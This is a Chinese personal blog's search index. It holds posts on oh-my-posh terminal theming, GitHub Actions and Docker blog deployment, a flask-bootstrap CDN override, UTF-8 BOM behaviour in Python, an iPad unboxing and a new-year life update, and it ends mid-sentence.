<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>简易的个性化终端指南</title>
      <link href="archives/jian-yi-de-ge-xing-hua-zhong-duan-zhi-nan.html"/>
      <url>archives/jian-yi-de-ge-xing-hua-zhong-duan-zhi-nan.html</url>
      
        <content type="html"><![CDATA[<p>基于 oh-my-posh3 的终端个性化简易指南</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>默认 bash 难配置，zsh 功能强大但尺寸大易卡顿，fish 虽算是一个优良的 shell，但它并不遵循 POSIX。</p><p>并且由于 oh-my-posh 伴随了我两年多，所以最终选择了 oh-my-posh 来写个性化终端。实际上参照官方文档和示例来写一个配置并不难，我写完下面的示例文件也只用了一个多钟，所以最终能用上一个称手的终端还是挺舒服的。</p><h1 id="适用于"><a href="#适用于" class="headerlink" title="适用于"></a>适用于</h1><ul><li>oh-my-posh (bash)</li><li>windows powershell, linux most distro, macos</li></ul><h1 id="从示例开始"><a href="#从示例开始" class="headerlink" title="从示例开始"></a>从示例开始</h1><pre><code class="json">{  &quot;$schema&quot;: &quot;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json&quot;,  &quot;blocks&quot;: [    {      &quot;type&quot;: &quot;newline&quot;    },    {      &quot;type&quot;: &quot;rprompt&quot;,      &quot;alignment&quot;: &quot;right&quot;,      &quot;segments&quot;: [        {          &quot;type&quot;: &quot;time&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#007ACC&quot;,          &quot;properties&quot;: {            &quot;postfix&quot;: &quot;&quot;          }        }      ]    },    {      &quot;type&quot;: &quot;prompt&quot;,      &quot;alignment&quot;: &quot;left&quot;,      &quot;segments&quot;: [        {          &quot;type&quot;: &quot;session&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#FFFFFF&quot;,          &quot;properties&quot;: {            &quot;user_info_separator&quot;: &quot; &lt;#b0bec5&gt;on&lt;/&gt; &quot;,            &quot;prefix&quot;: &quot;&quot;,            &quot;postfix&quot;: &quot;&quot;,            &quot;user_color&quot;: &quot;#00e676&quot;,            &quot;host_color&quot;: &quot;#7c4dff&quot;          }        },        {          &quot;type&quot;: &quot;os&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#26C6DA&quot;,          &quot;properties&quot;: {            &quot;macos&quot;: &quot;\ue711&quot;,            &quot;linux&quot;: &quot;\ue712&quot;,            &quot;wsl&quot;: &quot;wsl&quot;,            &quot;wsl_separator&quot;: &quot; &quot;,            &quot;windows&quot;: &quot;\ue70f&quot;,            &quot;display_distro_name&quot;: false,            &quot;alpine&quot;: &quot;\uf300&quot;,            &quot;arch&quot;: &quot;\uf303&quot;,            &quot;centos&quot;: &quot;\uf304&quot;,            &quot;debian&quot;: &quot;\uf306&quot;,            &quot;elementary&quot;: &quot;\uf309&quot;,            &quot;fedora&quot;: &quot;\uf30a&quot;,            &quot;gentoo&quot;: &quot;\uf30d&quot;,            &quot;manjaro&quot;: &quot;\uf312&quot;,            &quot;mint&quot;: &quot;\uf30f&quot;,            &quot;opensuse&quot;: &quot;\uf314&quot;,            &quot;raspbian&quot;: &quot;\uf315&quot;,            &quot;ubuntu&quot;: &quot;\uf31c&quot;,            &quot;postfix&quot;: &quot; &quot;          }        },        {          &quot;type&quot;: &quot;path&quot;,          &quot;style&quot;: &quot;powerline&quot;,          &quot;foreground&quot;: &quot;#b0bec5&quot;,          &quot;background&quot;: &quot;#2f2f2f&quot;,          &quot;properties&quot;: {            &quot;prefix&quot;: &quot;&quot;,            &quot;style&quot;: &quot;mixed&quot;,            &quot;home_icon&quot;: &quot; \uf015 &quot;,            &quot;folder_separator_icon&quot;: &quot;/&quot;          }        },        {          &quot;type&quot;: &quot;git&quot;,          &quot;style&quot;: &quot;powerline&quot;,          &quot;powerline_symbol&quot;: &quot;\uE0B0&quot;,          &quot;foreground&quot;: &quot;#193549&quot;,          &quot;background&quot;: &quot;#95ffa4&quot;,          &quot;properties&quot;: {            &quot;display_stash_count&quot;: true,            &quot;display_upstream_icon&quot;: true          }        },        {          &quot;type&quot;: &quot;command&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#b0bec5&quot;,          &quot;properties&quot;: {            &quot;shell&quot;: &quot;bash&quot;,            &quot;command&quot;: &quot;git log --pretty=format:%cr -1 || date +%H:%m:%S&quot;          }        }      ]    },    {      &quot;type&quot;: &quot;newline&quot;    },    {      &quot;type&quot;: &quot;prompt&quot;,      &quot;alignment&quot;: &quot;left&quot;,      &quot;segments&quot;: [        {          &quot;type&quot;: &quot;root&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#FF0266&quot;,          &quot;properties&quot;: {            &quot;prefix&quot;: &quot;&quot;          }        },        {          &quot;type&quot;: &quot;python&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#FFFFFF&quot;,          &quot;properties&quot;: {            &quot;prefix&quot;: &quot;(venv) &quot;,            &quot;postfix&quot;: &quot; &quot;,            &quot;display_mode&quot;: &quot;text&quot;,            &quot;display_version&quot;: false          }        },        {          &quot;type&quot;: &quot;exit&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#CB4B16&quot;        },        {          &quot;type&quot;: &quot;text&quot;,          &quot;style&quot;: &quot;plain&quot;,          &quot;foreground&quot;: &quot;#FF0266&quot;,          &quot;properties&quot;: {            &quot;prefix&quot;: &quot;&quot;,            &quot;text&quot;: &quot;\u09F8&quot;          }        }      ]    }  ],  &quot;final_space&quot;: true}</code></pre><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><p>本人使用的是 JetBrainsMono Nerd Font Mono Regular</p><p>四位数的 unicode emoji 基本支持，五位数的没测过全部</p><p>如果需要使用五位数 unicode，可以去 <a href="http://www.russellcottrell.com/greek/utilities/SurrogatePairCalculator.htm" rel="noopener" target="_blank">Surrogate Pair Calculator etc.</a> 转码</p><h2 id="选择提示符"><a href="#选择提示符" class="headerlink" title="选择提示符"></a>选择提示符</h2><p>示例采用了 unicode <code>\u09F8</code></p><p>可以去 <a href="https://unicode-table.com/en/" rel="noopener" target="_blank">Basic Latin — ✔️ ❤️ ★ Unicode Character Table</a> 寻找自己喜欢的提示符</p><p>分享一些我第一眼比较喜欢的</p><pre><code>\u29F3 形状\uA538\u09F8\u09FB\u2B9E 右箭头\u27A5\u25C6 菱形\u261B right hand\u2605 星星\u2600 太阳\u2BFD male\u2C96 lambda\u03BB</code></pre><h2 id="换行效果"><a href="#换行效果" class="headerlink" title="换行效果"></a>换行效果</h2><p>示例在每行 prompt / 命令 之间加上了自动换行，这样可以使命令看起来不是那么密集</p><p>如果需要移除，请删除第一个 newline block</p><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>这个 type 是用来执行 shell command，将输出追加到 segment 内</p><p>使用这个功能可以实现很多 DIY 效果</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="https://i.loli.net/2021/04/04/sMJnXau1bS3TqWI.png" alt="图"></p><blockquote><p>忘了把 root 的提示符截图进去了，懒得加了</p></blockquote><h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p>Docs: <a href="https://ohmyposh.dev/docs/configure" rel="noopener" target="_blank">https://ohmyposh.dev/docs/configure</a></p><p>Schema: <a href="https://github.com/JanDeDobbeleer/oh-my-posh/blob/main/themes/schema.json" rel="noopener" target="_blank">https://github.com/JanDeDobbeleer/oh-my-posh/blob/main/themes/schema.json</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>博客自动化部署-2020</title>
      <link href="archives/bo-ke-bu-shu-2020.html"/>
      <url>archives/bo-ke-bu-shu-2020.html</url>
      
        <content type="html"><![CDATA[<p><strong>去年</strong>写的一个博客 Actions 配合 Docker 的部署方法以及速度优化</p><a id="more"></a><blockquote><p>由于时间间隔较长，并且实际上使用这个方案部署了两天后我就放弃了，所以本人无法保证本文的代码可以正常使用</p></blockquote><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>去年年底想着高考完了优化一下博客的访问速度，且由于 Cloudflare + Github Pages 的 Free Server 方案在国内的速度是有所谓极限的，故后来尝试在 Aliyun 国内机上部署，就出现了这套方案。</p><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>本方案使用两个 repo，一个是存放博客源代码的，建议设为私有库，主要做代码管理，这里命名为 source-repo；另一个存放生成的静态文件，也就是 gh-pages 库，这里命名为 public-repo。</p><h2 id="第一个-Actions-主要的事务"><a href="#第一个-Actions-主要的事务" class="headerlink" title="第一个 Actions 主要的事务"></a>第一个 Actions 主要的事务</h2><ul><li>根据 source-repo 的源代码构建静态网页文件</li><li>将 Dockerfile、cert(optional not recommended) 放到网站根目录</li><li>将第二个 Actions 放到 .github/workflows</li></ul><h2 id="第二个-Actions-主要的事务"><a href="#第二个-Actions-主要的事务" class="headerlink" title="第二个 Actions 主要的事务"></a>第二个 Actions 主要的事务</h2><ul><li>根据根目录构建一个 Apache Docker</li><li>将构建好的镜像推送到阿里镜像仓库</li><li>连接待部署的服务器并拉取镜像运行</li></ul><p><strong>tips:</strong> 由于双 Actions 方案稍微复杂，并不适合初入 Actions 的人，所以此处不再复述 repo、aliyun server、docker account 的访问和配置。</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><h2 id="Actions-1"><a href="#Actions-1" class="headerlink" title="Actions 1"></a>Actions 1</h2><pre><code>name: Push CIon: [push]jobs:  build:    runs-on: ubuntu-latest    strategy:      matrix:        node-version: [10.x]    steps:      - uses: actions/checkout@master      - name: Use Node.js ${{ matrix.node-version }}        uses: actions/setup-node@v1        with:          node-version: ${{ matrix.node-version }}      - name: Environment Setup        env:          id_rsa: ${{ secrets.BLOG_ACTIONS_PRI }}        run: |          mkdir -p ~/.ssh/          echo &quot;$id_rsa&quot; &gt; ~/.ssh/id_rsa          chmod 600 ~/.ssh/id_rsa          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts          git config --global user.name &#39;iyume&#39;          git config --global user.email &#39;iyumelive@gmail.com&#39;      - name: Install Dependencies        run: |          npm i -g hexo-cli          npm i      - name: Generate Public        run: |          gulp default      - name: First-Step Deployer        run: |          cd public          mkdir -p .github/workflows          cp ../two_step_deploy/actions.yml .github/workflows/actions.yml          cp ../two_step_deploy/Dockerfile Dockerfile          cp ../two_step_deploy/.dockerignore .dockerignore          cp ../two_step_deploy/httpd.conf httpd.conf          cp ../two_step_deploy/httpd-vhosts.conf httpd-vhosts.conf          # cp ../two_step_deploy/cert cert -r          git init          git remote add origin git@github.com:iyume/hexo-blog.git          git commit --allow-empty -n -m &quot;Initial commit&quot;          git add .          git commit -m &quot;[Force Updated] Actions ID $GITHUB_RUN_NUMBER&quot;          git push origin master -f          git branch gh-pages          git checkout gh-pages          git merge master          git reset HEAD^          git add .          git rm --cached -r .github          git commit -m &quot;[Site Updated] Force Actions ID $GITHUB_RUN_NUMBER&quot;          git push origin gh-pages -f      - name: Second-Step Deployer        run: |          echo &quot;Second-Step is deployed by repo hexo-blog&quot;</code></pre><h2 id="Actions-2"><a href="#Actions-2" class="headerlink" title="Actions 2"></a>Actions 2</h2><pre><code>name: Docker Build and Pushon: [push]jobs:  build:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@master      - name: Build and Push        env:          registry: ${{ secrets.REGISTRY }}          username: ${{ secrets.USERNAME }}          password: ${{ secrets.PASSWORD }}        run: |          docker login --username $username --password $password registry.cn-hongkong.aliyuncs.com          docker build -t $registry:$GITHUB_RUN_NUMBER .          docker push $registry:$GITHUB_RUN_NUMBER          docker tag $registry:$GITHUB_RUN_NUMBER $registry:latest          docker push $registry:latest      - name: Pull and Deploy        uses: appleboy/ssh-action@master        env:          registry: ${{ secrets.REGISTRY }} # can not be used as no-string          repo_username: ${{ secrets.USERNAME }}          repo_password: ${{ secrets.PASSWORD }}        with:          host: ${{ secrets.HOST_IP }}          username: ${{ secrets.HOST_USERNAME }}          password: ${{ secrets.HOST_PASSWORD }}          port: 22          envs: registry, repo_username, repo_password          script: |            docker stop myblog || true            docker rm myblog || true            docker rmi ${{ secrets.REGISTRY }}:latest || true            docker login --username &quot;$repo_username&quot; --password &quot;$repo_password&quot; registry.cn-hongkong.aliyuncs.com            docker pull ${{ secrets.REGISTRY }}:latest            docker run -d --name myblog -p 80:80 -p 443:443 ${{ secrets.REGISTRY }}:latest</code></pre><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><pre><code>FROM httpdWORKDIR /usr/local/apache2RUN rm -rf htdocs/*COPY . htdocs/RUN rm conf/extra/httpd-vhosts.conf &amp;&amp; mv htdocs/httpd-vhosts.conf conf/extra/httpd-vhosts.confRUN rm conf/httpd.conf &amp;&amp; mv htdocs/httpd.conf conf/httpd.conf# RUN mkdir cert# COPY cert/* cert/EXPOSE 80EXPOSE 443</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>新年近况</title>
      <link href="archives/xin-nian-jin-kuang.html"/>
      <url>archives/xin-nian-jin-kuang.html</url>
      
        <content type="html"><![CDATA[<p>记录最近我到底忙了个啥</p><a id="more"></a><p><strong>第一件事</strong></p><p>今年不同往常，大学从 1.3 就开始了时长<strong>两个月</strong>的寒假，并且由于疫情原因也不知道会不会又像去年那样展开网课。并且从去年 12 月中旬开始，从我被老师推荐到一个公司做网站的时候，应该就稍微忙了起来。但其实好像也不是那么忙，因为这个项目并不是那么难写，老师也没要求移动端适配（我不擅长的地方）</p><p>网站计划其实也可以讲讲，初始计划是拿 <code>tailwindcss</code> + <code>fastapi</code> + <code>flask</code> 完成前后端分离设计的。写了一会后发现 <code>flask</code> 根本没有存在的必要…就拿 <code>fastapi</code> 把前端重写了一遍。</p><p>这应该算是本人的第一桶金，后面会写篇比较详细的有关的文章。同时这也是本人第一次接手算得上是大型的项目，也有相应的报酬，于是打算回学校把笔记本给换了。</p><p><strong>第二件事</strong></p><p>由于某些原因，本人较为迫切需要一个 Arcaea 的查分机器人。于是花了接近一星期的时间完成了一个 QQbot。在这一个星期前我完全没接触过 QQbot 的编写。</p><p>主要成果有 <a href="https://github.com/iyume/nonebot-plugin-ipypreter" rel="noopener" target="_blank">消息交互式 Python 解释器</a> 和 <a href="https://github.com/iyume/nonebot-plugin-arcaea" rel="noopener" target="_blank">Arcaea 查分器</a> 这两个针对 nonebot2 开发的插件。目前已发布到插件广场。</p><p><strong>第三件事</strong></p><p>和朋友出去打街机，然后过新年。</p><p><strong>接下来是对迟来的年度总结的解释</strong></p><p>这次年度总结不同寻常的地方是 1.我高中毕业了 2.我满十八了</p><p>所以这次年度总结会有较长的篇幅是不可避免的，只是目前处于不是很方便写年度总结的处境。我的预测是如果三月正常开学，那么我三月中旬应该就可以完成年度总结的编写。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iPad 8 开箱</title>
      <link href="archives/ipad-8-kai-xiang.html"/>
      <url>archives/ipad-8-kai-xiang.html</url>
      
        <content type="html"><![CDATA[<p>iPad mini 5 2020 开箱（附视频？）</p><a id="more"></a><p>起因是在双十一抽到了 1111 大红包，原价 2999 实付款 1877，原本想等后面一点再买的，既然抽到红包，那就直接入手了。</p><p>iPad 8 是在 2020 年 9 月 15 日线上发布的，性价比方面比 iPad 7 高了不少，又正好卡在双十一之前了，只能说是碰巧。</p><blockquote><p>Brand: iPad 8<br>CPU: A12 Bionic<br>OS: iPad OS 14<br>Apperence: Space Gray<br>ROM: 128G</p></blockquote><p>至于渠道，是从淘宝买的，店家我就不说了，看了几百条评论后才下手买的。有人说是官换机，但也没人证实，实际用起来也没什么差别。序列号是正确的，激活后也显示了保修到期日为 2021/11/14</p><p>从淘宝买的原因有两个，一是支付宝红包好像不能在 Apple 官网付（虽然淘宝也有旗舰店），二是这个商家送了很多东西，主要包括</p><ul><li>蓝牙键盘（非常方便）</li><li>保护套</li><li>触控笔</li><li>高清膜</li><li>耳机（实测一般）</li></ul><p>相比旗舰店购买的裸机还是好了许多的，我也并不是非得从官网入手才能用的那种人</p><p>见下图<br><img src="https://i.loli.net/2020/12/11/2IXlUmgnKAGSQRk.jpg" alt></p><p>买回来就随便看了看，然后就开始下载 Arcaea 了，也没去整什么爱思助手，感觉没什么必要，毕竟对我来说评测最好的方法还是玩音游，我个人对延迟比较敏感，可能多个 10ms 少个 10ms 都可以感觉出来。</p><p><img src="https://i.loli.net/2020/12/11/NVq726alJmGUP1M.jpg" alt></p><p>第一次拿平板打音游，体验感真的起飞了~</p><p>可能有人不知道我是个音游爱好者，个人 Arcaea 时长以及达到了 200h，ptt 10.72，也算 1/4 个音游大佬了？hh</p><p>虽然平时也喜欢打街机，但还是 Arc 最喜欢了，Cytus 什么的早就被我堆到墙角去了ww</p><iframe src="//player.bilibili.com/player.html?aid=628006822&bvid=BV1tt4y1Y7e6&cid=265421678&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width: 100%; height: 500px;"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flask-bootstrap 优雅配置国内加速源</title>
      <link href="archives/flask-bootstrap-pei-zhi-guo-nei-yuan.html"/>
      <url>archives/flask-bootstrap-pei-zhi-guo-nei-yuan.html</url>
      
        <content type="html"><![CDATA[<p>在不修改 flask-bootstrap package 的情况下优雅使用加速源</p><a id="more"></a><blockquote><p>@@ 2020-12-14 @@</p></blockquote><h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>flask-bootstrap 是用于 flask 框架中一个 pip 包，通过 jinja2 模板继承特性可以快速开发 bootstrap。</p><p>但这个包默认采用的是 cloudflare 源，默认会包含 bootstrap.css、bootstrap.js、jquery.js，此外还可以包含 html5shiv、respond.js，这个可以通过一定方法查看，比如：</p><pre><code>In [1]: from flask import FlaskIn [2]: from flask_bootstrap import BootstrapIn [3]: app = Flask(__name__)In [4]: bootstrap = Bootstrap(app)In [5]: app.extensionsOut[5]: {&#39;bootstrap&#39;: {&#39;cdns&#39;: {&#39;local&#39;: &lt;flask_bootstrap.StaticCDN at 0x743831b0&gt;,   &#39;static&#39;: &lt;flask_bootstrap.StaticCDN at 0x743b9e50&gt;,   &#39;bootstrap&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743a4fb0&gt;,   &#39;jquery&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743dd550&gt;,   &#39;html5shiv&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743cf3d0&gt;,   &#39;respond.js&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743cf5d0&gt;,   &#39;bootcdn_bootstrap&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743cf0f0&gt;,   &#39;bootcdn_jquery&#39;: &lt;flask_bootstrap.ConditionalCDN at 0x743cf4b0&gt;}}, &#39;nav_renderers&#39;: {&#39;bootstrap&#39;: (&#39;flask_bootstrap.nav&#39;, &#39;BootstrapRenderer&#39;),  None: (&#39;flask_bootstrap.nav&#39;, &#39;BootstrapRenderer&#39;)}}</code></pre><p>但是在国内，cloudflare 的速度真是令人感动。</p><p>纵观一圈网上的解决方法，总体来说分两种思路：(1) 在 __init__.py 暴力修改 (2) 修改 flask-bootstrap package</p><p>第一种方法代码量较大，并且暴力修改代码使其可读性大大降低；第二种方法在环境变了或者包更新了的情况都需要重新配置，太麻烦了。</p><h2 id="Inplement"><a href="#Inplement" class="headerlink" title="Inplement"></a>Inplement</h2><p>一个包的主体部分是不会变的，那么我们在项目主入口用类继承重写一下方法就行了，并且在模板继承时重写 bootstrap/base.html 中的 styles 和 scripts</p><h1 id="Recette"><a href="#Recette" class="headerlink" title="Recette"></a>Recette</h1><blockquote><p>这里采用 bootcdn 作范例</p></blockquote><p>首先要读源码，了解 flask-bootstrap 这个包怎么运行，我就不写怎么读了（</p><p>包目录</p><pre><code>//venv/lib/python3.x/site-packages/flask_bootstrap</code></pre><p>我们知道 Python 在 import flask-bootstrap 时，其实就是 import 了这个目录下的<code>__init__.py</code>再通过对象方法调用相应的类，from flask-bootstrap import Bootstrap 就是直接导入了 Bootstrap 这个类</p><p>我们需要用到<code>__init__.py</code>中以下类/包变量</p><pre><code>Bootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSION</code></pre><h2 id="Initialization"><a href="#Initialization" class="headerlink" title="Initialization"></a>Initialization</h2><pre><code>from flask import Flaskfrom flask_bootstrap import Bootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSION</code></pre><h2 id="Rewrite-inherited-class-function"><a href="#Rewrite-inherited-class-function" class="headerlink" title="Rewrite inherited class function"></a>Rewrite inherited class function</h2><pre><code>class Bootstrap_with_bootcdn(Bootstrap): # 子类    def init_app(self, app):             # 重写        super().init_app(app)            # 继承        local = StaticCDN(&#39;bootstrap.static&#39;, rev=True)        static = StaticCDN()        def lwrap(cdn, primary=static):            return ConditionalCDN(&#39;BOOTSTRAP_SERVE_LOCAL&#39;, primary, cdn)        bootcdn_bootstrap = lwrap(WebCDN(&#39;//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/%s/&#39; % BOOTSTRAP_VERSION), local)        bootcdn_jquery = lwrap(WebCDN(&#39;//cdn.bootcdn.net/ajax/libs/jquery/%s/&#39; % JQUERY_VERSION), local)        app.extensions[&#39;bootstrap&#39;][&#39;cdns&#39;][&#39;bootcdn_bootstrap&#39;] = bootcdn_bootstrap        app.extensions[&#39;bootstrap&#39;][&#39;cdns&#39;][&#39;bootcdn_jquery&#39;] = bootcdn_jquery</code></pre><p>我在此处加入了两条键，分别是<code>bootcdn_bootstrap</code>和<code>bootcdn_jquery</code>，在后面模板重写需要用到</p><p>如果你想加入别的 CDN，只需要按照上面的规则添加就行了</p><p>再将其实例化</p><pre><code>app = Flask(__name__)bootstrap = Bootstrap_with_bootcdn(app)</code></pre><h2 id="Rewrite-inherited-template-block"><a href="#Rewrite-inherited-template-block" class="headerlink" title="Rewrite inherited template block"></a>Rewrite inherited template block</h2><pre><code>{% block styles %}<link href="{{ bootstrap_find_resource('css/bootstrap.css', cdn='bootcdn_bootstrap') }}" rel="stylesheet">    {% endblock %}{% block scripts %}<script src="{{ bootstrap_find_resource('jquery.js', cdn='bootcdn_jquery') }}"></script><script src="{{ bootstrap_find_resource('js/bootstrap.js', cdn='bootcdn_bootstrap') }}"></script>{% endblock %}</code></pre><p>我们知道 super() 是类继承用的函数，但是这在模板继承也可以用到，并且具有非常类似的作用，如果不在 block 中加入 super()，会默认使用子模板的同名 block 覆盖父模板中的同名 block</p><p>这里的 bootstrap_find_resource 方法中的属性 cdn 要对应我们之前重写的类属性</p><h1 id="Others-Optimization"><a href="#Others-Optimization" class="headerlink" title="Others - Optimization"></a>Others - Optimization</h1><p>我们可以将以上代码打包放进<code>config.py</code>，这是我比较推荐的一种方式</p><blockquote><p>./config.py</p></blockquote><pre><code>from flask_bootstrap import Bootstrap, ConditionalCDN, WebCDN, StaticCDN, BOOTSTRAP_VERSION, JQUERY_VERSIONclass Bootstrap_with_bootcdn(Bootstrap):    def init_app(self, app):        super().init_app(app)        local = StaticCDN(&#39;bootstrap.static&#39;, rev=True)        static = StaticCDN()        def lwrap(cdn, primary=static):            return ConditionalCDN(&#39;BOOTSTRAP_SERVE_LOCAL&#39;, primary, cdn)        bootcdn_bootstrap = lwrap(WebCDN(&#39;//cdn.bootcdn.net/ajax/libs/twitter-bootstrap/%s/&#39; % BOOTSTRAP_VERSION), local)        bootcdn_jquery = lwrap(WebCDN(&#39;//cdn.bootcdn.net/ajax/libs/jquery/%s/&#39; % JQUERY_VERSION), local)        app.extensions[&#39;bootstrap&#39;][&#39;cdns&#39;][&#39;bootcdn_bootstrap&#39;] = bootcdn_bootstrap        app.extensions[&#39;bootstrap&#39;][&#39;cdns&#39;][&#39;bootcdn_jquery&#39;] = bootcdn_jquery</code></pre><blockquote><p>./app.py</p></blockquote><pre><code>from config import Bootstrap_with_bootcdnapp = Flask(__name__)bootstrap = Bootstrap_with_bootcdn(app)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BOM、UTF-8 和浏览器编码问题</title>
      <link href="archives/bom-de-jie-shao.html"/>
      <url>archives/bom-de-jie-shao.html</url>
      
        <content type="html"><![CDATA[<p>一篇略水的文章</p><a id="more"></a><p>原本只是无意间发现 <a href="https://github.com/luhuisicnu/The-Flask-Mega-Tutorial-zh" rel="noopener" target="_blank">https://github.com/luhuisicnu/The-Flask-Mega-Tutorial-zh</a> 这个项目，想拷到本地查看（毕竟 Gitbook 的速度也是挺不理想）</p><p>之前虽然有过类似的操作，当时是用 gitbook serve 实现在本地浏览器查看，不过这样的操作未免过于繁琐。于是这次便想着配合 wsl apache + markdown viewer 来简化操作流程</p><p>当我部署完成访问<code>SUMMARY.md</code>时，却出现了中文乱码，再点开浏览器编码，发现浏览器自动使用了西文编码而不是<code>UTF-8</code></p><p>想到我之前参赛中遇到的一些小问题，结合起来写出了这篇关于 Unicode 各种文件头中的介绍文章，以及一些个人的猜测</p><h2 id="先讲讲utf-8和utf-8-with-bom"><a href="#先讲讲utf-8和utf-8-with-bom" class="headerlink" title="先讲讲utf-8和utf-8 with bom"></a>先讲讲<code>utf-8</code>和<code>utf-8 with bom</code></h2><blockquote><p>BOM（Byte Order Mark），字节顺序标记，出现在文本文件头部，Unicode编码标准中用于标识文件是采用哪种格式的编码。<br>—-百度百科</p></blockquote><p>建立 abc.txt 用<code>utf-8</code>保存<br>建立 abd.txt 用<code>utf-8 with bom</code>保存</p><p>如果你有 VSCode，那么打开文件在右下角便可以看见一个<code>UTF-8</code>标识，点开再通过编码保存就行了</p><p>并给两个文件写入相同内容</p><p>再使用 010 Editor 分别打开两个文件</p><p>我们知道<code>utf-8</code>是无字节序的，没有所谓文件头<br>而 UTF-8 with BOM 文件头多出来了<code>EF BB BF</code></p><p>相关网站：<a href="https://developer.ibm.com/zh/articles/unicode-programming-language/" rel="noopener" target="_blank">https://developer.ibm.com/zh/articles/unicode-programming-language/</a></p><p>可以得知虽然 BOM 的意思是字节顺序标记，但在 UTF-8 编码格式的文本中，如果添加了 BOM，则标示该文本是由 UTF-8 编码方式编码的，而不用来说明字节序</p><h2 id="Python-处理utf-8-with-bom"><a href="#Python-处理utf-8-with-bom" class="headerlink" title="Python 处理utf-8 with bom"></a>Python 处理<code>utf-8 with bom</code></h2><blockquote><p>之前在比赛中使用<code>burp</code>爆破时，总会发现字典的第一个密码在<code>burp</code>中会显示成乱码</p></blockquote><p>先试着打开一下第一行会乱码的那个文件</p><pre><code>with open(&#39;./password.txt&#39;, &#39;r&#39;) as f:    t = f.read()print(t.split(&#39;\n&#39;))</code></pre><p>第一行是<code>\ufeffadmin</code>，多了个奇怪的东西<code>\ufeff</code></p><p>并且这个东西可以通过如下语句去掉，只是换了个编码方式</p><pre><code>with open(&#39;./password.txt&#39;, &#39;r&#39;, encoding=&#39;utf-8-sig&#39;) as f:    t = f.read()print(t.split(&#39;\n&#39;))</code></pre><p>我们知道<code>\u</code>就是表示<code>unicode</code>，那么<code>\ufeff</code>是什么呢？</p><p>尝试以下代码</p><pre><code>&#39;i like milk&#39;.encode(&#39;utf-8-sig&#39;)# output: b&#39;\xef\xbb\xbfi like milk&#39;&#39;i like milk&#39;.encode(&#39;utf-8-sig&#39;).decode(&#39;utf-8&#39;)# output: &#39;\ufeffi like milk&#39;</code></pre><p>第一行中出现了<code>\xef\xbb\xbf</code>，<code>\x</code>是表示十六进制的，并且<code>EF BB BF</code>正好就是 UTF-8 with bom 的文件头部</p><p>在第二行中使用<code>utf-8-sig</code>编码再使用<code>utf-8</code>解码便出现了<code>\ufeff</code>这个玩意</p><p>可以推测<code>\ufeff</code>就是之前提到的多出的三个十六进制符<code>EF BB BF</code>在<code>decode(&#39;utf-8&#39;)</code>时被错误识别而编码出来的部分</p><p>并且通过查阅资料，可以发现<code>FE FF</code>是 UTF-16-BE 的 BOM</p><p>但是也有许多讲不通的地方，于是去查了谷歌发现这样一句话</p><blockquote><p>Our friend FEFF means different things, but it’s basically a signal for a program on how to read the text. It can be UTF-8 (more common), UTF-16 , or even UTF-32 . FEFF itself is for UTF-16 — in UTF-8 it is more commonly known as 0xEF,0xBB, or 0xBF<br>个人翻译：FEFF 可以代表不同的东西，但它基本上是一个程序阅读一个文本的信号。它可以意味着 UTF-8（更常见），UTF-16，甚至是 UTF-32。FEFF 自身是属于 UTF-16，在 UTF-8 中它通常被称为 0xEF, 0xBB, 0xBF</p></blockquote><p>于是我有个了更大胆的猜测：因为 UTF-8 无字节序，它并不知道面对的文件编码到底是哪种，所以我们平时保存所谓的 UTF-8，实际上会以 UTF-16 读取！</p><p>说那么多，不如来动手试试！</p><p>先把<code>abc.txt</code>用 UTF-16-BE 储存</p><pre><code>with open(&#39;./abc.txt&#39;, &#39;r&#39;, encoding=&#39;utf-16-be&#39;) as f:    t = f.read()print(t)# output: &#39;\ufeffadddd这是中文\n\nand this is milk.\n&#39;</code></pre><p>出现了熟悉的<code>\ufeff</code>！</p><p>与 UTF-8 